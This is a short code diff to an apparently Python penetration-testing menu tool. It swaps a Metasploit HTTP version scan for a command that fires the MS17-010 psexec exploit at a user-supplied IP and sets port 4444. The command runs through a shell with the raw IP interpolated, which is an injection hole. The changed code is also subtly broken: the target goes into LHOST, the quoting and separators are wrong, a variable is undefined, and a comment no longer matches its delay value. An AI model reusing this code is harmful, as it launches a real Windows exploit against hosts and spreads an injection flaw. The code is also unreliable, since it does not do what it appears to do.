@@ -86,7 +86,7 @@ def show_main_menu_logo():
         print(Fore.GREEN + line)  # Blue for even lines  
       else:  
         print(Fore.LIGHTGREEN_EX + line)  # White for odd lines  
-      time.sleep(0.3)  # Medium delay (0.3 seconds per line)  
+      time.sleep(0.1)  # Medium delay (0.3 seconds per line)  
   
 # Function to run a scan with a given command  
 def run_scan(command, ip=None):  
@@ -514,7 +514,7 @@ def metasploit_scan():
                 print(f"{key}: {value}")  
               exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()  
               if exploit_choice in exploits:  
-                metasploit_command = f"msfconsole -q -x use auxiliary/scanner/http/http_version set RHOST {ip}; run\"" 
+                metasploit_command = f"msfconsole -q -x use exploit/windows/smb/ms17_010_psexec set LHOST {ip}; set LPORT 4444 run\"" 
                 subprocess.Popen(metasploit_command, shell=True)   
                 if stderr:  
                    print(Fore.RED + "Error during Metasploit:", stderr.decode())  
